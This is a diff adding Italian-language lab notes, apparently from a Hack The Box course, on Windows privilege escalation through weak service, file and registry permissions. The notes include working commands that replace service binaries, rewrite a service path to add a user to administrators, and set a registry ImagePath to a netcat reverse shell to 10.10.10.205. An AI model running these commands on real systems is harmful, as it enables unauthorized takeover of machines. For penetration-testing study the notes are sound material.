@@ -666,3 +666,110 @@ Quando windows carica una Dll fa questo ordine:
 
 ### Eseguiamo SystemPropertiesAdvanced
 `C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe`
+
+
+# Weak Permissions
+Questo tipo di vulnerabilita' non sono comuni su applicazioni fatte da grandi produttori di software, ma sono comuni su software fatti da piccole aziende che vendono a produttori piu' grandi.
+
+Spesso i Servizi si installano con privilegi di SYSTEM
+
+## Permissive File System ACLs
+
+### Running SharpUp
+Possiamo runnare SharpUp dal GhostPack (https://github.com/GhostPack/SharpUp/)per checkare per eseguibili di servizi con ACL deboli
+
+`PS C:\htb> .\SharpUp.exe audit` Se troviamo un binario modificabile **=== Modifiable Service Binaries ===**  e magari e' un servizio che ad ogni restart viene eseguito potremmo avere una shell.
+  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+  
+  
+### Checking Permissions with icacls
+Possiamo usare il built-in **icacls** per verificare se effettivamente e' vulnerabile 
+`PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"`
+Everyone:(I)(F) Cio' significa che ognuno puo'  manipolare questo eseguibile
+
+### Replacing Service Binary
+```
+C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+C:\htb> sc start SecurityService
+```
+
+## Weak Service Permissions
+runnando `C:\htb> SharpUp.exe audit`. esce fuori **=== Modifiable Services ===** quindi e' potenzialmente configurato male.
+
+Possiamo usare **AccessChk** dai Sysinternals per enumerare i permessi sul servizio.
+
+The flags we use, in order, are **-q** (omit banner), **-u** (suppress errors), **-v** (verbose), **-c** (specify name of a Windows service), and **-w** (show only objects that have write access). Here we can see that all Authenticated Users have SERVICE_ALL_ACCESS rights over the service, which means full read/write control over it.
+
+`C:\htb> accesschk.exe /accepteula -quvcw WindscribeService`
+
+`C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"` Cambiamo il path dell' eseguibile e ci aggiungiamo agli amministratori.
+
+Vabbe' poi lo stoppiamo e poi lo Restartiamo.
+
+N.B. E' NORMALE CHE QUANDO LO RESTARTIAMO DIA ERRORE PERCHE' NEL BINPATH ABBIAMO MESSO UN COMANDO E NON UN ESEGUIBILE.
+
+
+## Cleanup
+
+### Reimpostare il Path dell' eseguibile
+`C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"`
+
+### Restartare il servizio
+`C:\htb> sc start WindScribeService`
+
+### Verifichiamo che il servizio sta runnando
+`C:\htb> sc query WindScribeService`
+
+
+## Unquoted Service Path
+
+Quando un servizio e' installato  la configurazione di registro deve contenere il path al binario che deve essere eseguito.
+Se il binario non e' contenuto nelle quote "" Windows provera' a localizzare il binario in molte cartelle.
+
+per esempio:
+se il path del binario e':
+
+`C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`
+
+Windows Provera' a caricare questi eseguibili con un .exe
+
+```
+C:\Program(.exe)
+C:\Program Files(.exe)
+C:\Program Files (x86)\System(.exe)
+C:\Program Files (x86)\System Explorer\service\SystemExplorerService64(.exe)
+```
+
+Se quindi possiamo scrivere un .exe prima che arrivi a quello vero possiamo eseguirlo quando si va a eseguire il servizio.
+
+### Searching for Unquoted Service Paths
+
+`C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`
+
+Purtroppo molto spesso non si puo' scrivere nella root directory o Program Files folder a meno che non si e' amministratori.
+Quindi MOLTO spesso si trovano unquoted service paths ma non sempre sono exploitabili
+
+
+## Permissive Registry ACLs
+
+E' anche utile cercare per weak ACL nei registri di WIndows usando **AccessChk**.
+
+`C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services` Checka l' utente mrb3n che permessi ha su le reg keys dei servizi.
+
+```
+RW HKLM\System\CurrentControlSet\services\ModelManagerService
+        KEY_ALL_ACCESS
+```
+Questo output significa che si puo' editare la reg entry.
+
+### Changing ImagePath with Powershell
+`PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"`
+
+
+## Modifiable Registry Autorun Binary
+
+### Check Startup Programs
+Possiamo usare WMIC per vedere quali programmi si eseguono all' avvio. Supponendo permessi di scrittura sul registro per un binario 
+
+`PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl`
+
